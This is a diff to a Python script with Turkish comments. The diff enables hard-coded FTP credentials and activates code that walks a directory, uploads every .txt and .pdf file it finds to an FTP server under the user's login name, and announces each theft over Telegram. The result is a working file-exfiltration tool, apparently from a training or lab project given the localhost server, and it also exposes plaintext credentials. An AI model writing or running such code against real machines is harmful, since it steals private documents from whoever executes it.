@@ -13,9 +13,9 @@ NerdeBasladik = os.getcwd()         # Başlanılan dizini tanımladık / Betik i
 SistemKullaniciAdi = os.getlogin()  # Betiğin çalıştığı oturum ismini tanımladık / Dosyaları nerden aldığımızı bileceğiz.
 
 FTP_Sunucu = "127.0.0.1"                                 # FTP adresimizi tanımladık
-#FTP_Kullanıcı = "KekikAkademi"                          # FTP kullanıcı adımızı tanımladık
-#FTP_Sifre = "keyiflerolsun"                             # FTP şifremizi tanımladık
-#FTPBaglantisi = FTP(FTP_Sunucu,FTP_Kullanıcı,FTP_Sifre) # FTP sunucumuza bağlandık
+FTP_Kullanıcı = "KekikAkademi"                          # FTP kullanıcı adımızı tanımladık
+FTP_Sifre = "keyiflerolsun"                             # FTP şifremizi tanımladık
+FTPBaglantisi = FTP(FTP_Sunucu,FTP_Kullanıcı,FTP_Sifre) # FTP sunucumuza bağlandık
 
 ############################
 ###Telegram
@@ -59,7 +59,7 @@ def KontrolEt(): # KontrolEt metodumuzu oluşturduk
         try: # try olası hatalar için
             if re.match(".*txt", i): # Eğer txt ile biten dosya varsa
                 print(Fore.GREEN + "\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + Fore.RED + i + "\n")
-                #FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
                 ############################
                 ###Telegram
                 gonderilecekYazi = "[+] {} 'de | Bunu Buldum >> {} \n[~] {} FTP'ye Yükledim".format(SistemKullaniciAdi,i,FTP_Sunucu)  # Gönderilecek Yazı tanımlamamızı yaptık
@@ -68,7 +68,7 @@ def KontrolEt(): # KontrolEt metodumuzu oluşturduk
             
             elif re.match(".*pdf", i): # Eğer pdf ile biten dosya varsa
                 print(Fore.GREEN + "\t\n[+] " + SistemKullaniciAdi + "'de | Bunu Buldum >> " + Fore.RED + i + "\n")
-                #FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
+                FTPBaglantisi.storbinary('STOR ' + f"{SistemKullaniciAdi}_{i}", open(i, "rb")) # Döngüde yakalanan dosyayı al, başına "SistemKullaniciAdi_" ekleyerek FTP'ye yükle
                 ############################
                 ###Telegram
                 gonderilecekYazi = "[+] {} 'de | Bunu Buldum >> {} \n[~] {} FTP'ye Yükledim".format(SistemKullaniciAdi,i,FTP_Sunucu)  # Gönderilecek Yazı tanımlamamızı yaptık
